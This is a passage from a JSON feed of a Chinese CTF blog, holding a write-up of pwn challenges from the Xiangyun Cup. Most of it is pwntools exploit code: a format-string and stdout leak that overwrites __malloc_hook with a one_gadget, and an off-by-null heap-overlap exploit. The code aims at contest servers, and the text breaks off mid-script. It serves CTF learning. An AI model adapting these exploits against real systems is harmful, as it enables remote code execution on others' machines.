triple-quoted-string string\">'''\n@File    :   sftpwn-wp.py\n@Time    :   2022/01/26 16:20:33\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "url": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "title": "祥云杯部分Pwn",
            "date_published": "2021-08-30T14:10:27.000Z",
            "content_html": "<p>再不复现估计都忘了</p>\n<a id=\"more\"></a>\n<h1 id=\"note\"><a class=\"markdownIt-Anchor\" href=\"#note\">#</a> note</h1>\n<p>说实话看到这个格式化字符串漏洞时我反应了挺久的</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1.png\" alt=\"1\"></p>\n<p>scanf 任意写，通过对 stdout 写入数据来泄露 libc，最后修改__malloc_hook 为 ogg 并通过 realloc 调整栈帧 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./2021note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25315'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'content:'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr: 0x'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rint\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>agr <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'say ?'</span><span class=\"token punctuation\">,</span>agr<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\nheap_addr <span class=\"token operator\">=</span> add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aaa'</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n_IO_2_1_stdin_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7f3038ceb8e0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7f3038cea6e0</span><span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span>_IO_2_1_stdin_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span>\nogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n__malloc_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span>\nrealloc <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg('__isoc99_scanf')</span>\n\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$saaaa'</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>realloc <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg('malloc')</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   2021note.py\n@Time    :   2021/08/21 09:57:32\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_freeversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_freeversion\">#</a> PassWordBox_FreeVersion</h1>\n<p>add 这里有个 offbynull</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/2.png\" alt=\"1\"></p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/3.png\" alt=\"1\"></p>\n<p>程序会对输入的数据每八字节通过 key 进行异或，第一次 add 会输出加密数据所以第一次 add 的数据为空则会直接输出 key</p>\n<p>之后就是 offbynull 构造堆块重叠了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdFree'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># key 0x0000000000004040</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6873</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    delete<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token 